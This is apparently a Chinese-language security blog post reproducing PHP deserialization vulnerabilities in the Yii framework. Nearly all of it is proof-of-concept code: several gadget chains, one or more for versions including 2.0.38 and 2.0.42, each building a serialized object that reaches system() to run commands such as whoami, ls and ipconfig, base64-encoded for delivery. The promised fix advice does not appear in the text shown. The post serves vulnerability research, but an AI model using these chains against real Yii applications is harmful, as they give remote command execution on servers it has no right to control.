---
title: Yii 反序列化漏洞复现
date: 2025-07-10 10:00:00
author: Xendr1a
categories: [CVE复现]
tags: [Yii, 反序列化]
description: Yii 反序列化漏洞复现：环境、复现步骤与修复建议。
toc: true
---

## Yii反序列化漏洞

```text
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ipconfig';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```

###### yii 2.2.37

```text
<?php

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'whoami';
        }
    }
}
namespace yii\db{

    use yii\web\DbSession;

    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct(){
            $this->_dataReader=new DbSession();
        }
    }
}
namespace yii\web{

    use yii\rest\IndexAction;

    class DbSession
    {
        public $writeCallback;
        public function __construct(){
            $a=new IndexAction();
            $this->writeCallback=[$a,'run'];
        }
    }
}

namespace{

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
}
```

###### yii 2.0.38

```text
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['isRunning'] = [new CreateAction(), 'run'];
        }
    }
}

// poc2
namespace Codeception\Extension{
    use Faker\Generator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this->processes = [new Generator()];
        }
    }
}
namespace{
    // 生成poc
    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
}
?>
```

```text
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'dir';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['render'] = [new CreateAction(), 'run'];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{

    use Faker\Generator;

    class See{
        protected $description;
        public function __construct()
        {
            $this->description = new Generator();
        }
    }
}
namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\See;
    class Swift_KeyCache_DiskKeyCache{
        private $keys = [];
        private $path;
        public function __construct()
        {
            $this->path = new See;
            $this->keys = array(
                "axin"=>array("is"=>"handsome")
            );
        }
    }
    // 生成poc
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
}
?>
```

###### yii 2.0.42

```text
<?php

namespace Faker;
class DefaultGenerator{
    protected $default ;
    function __construct($argv)
    {
        $this->default = $argv;
    }
}

class ValidGenerator{
    protected $generator;
    protected $validator;
    protected $maxRetries;
    function __construct($command,$argv)
    {
        $this->generator = new DefaultGenerator($argv);
        $this->validator = $command;
        $this->maxRetries = 99999999;
    }
}

namespace Codeception\Extension;
use Faker\ValidGenerator;
class RunProcess{
    private $processes = [];
    function __construct($command,$argv)
    {
        $this->processes[] = new ValidGenerator($command,$argv);
    }
}

$exp = new RunProcess('system','whoami');
echo(base64_encode(serialize($exp)));
```

```text
<?php

namespace yii\rest
{
    class IndexAction{
        function __construct()
        {
            $this->checkAccess = 'system';
            $this->id = 'whoami';
        }
    }
}

namespace Symfony\Component\String
{
    use yii\rest\IndexAction;
    class LazyString
    {
        function __construct()
        {
            $this->value = [new indexAction(), "run"];
        }
    } 
    class UnicodeString
    {
        function __construct()
        {
            $this->value = new LazyString();
        }
    }
}

namespace Faker
{
    use Symfony\Component\String\LazyString;
    class DefaultGenerator
    {
        function __construct()
        {
            $this->default = new LazyString();
        }
    }

    class UniqueGenerator
    {
        function __construct()
        {
            $this->generator = new DefaultGenerator();
            $this->maxRetries = 99999999;
        }

    }
}

namespace Codeception\Extension
{
    use Faker\UniqueGenerator;
    class RunProcess
    {
        function __construct()
        {
            $this->processes[] = new UniqueGenerator();
        }
    }
}

namespace
{
    use Codeception\Extension\RunProcess;
    $exp = new RunProcess();
    echo(base64_encode(serialize($exp)));
}
```
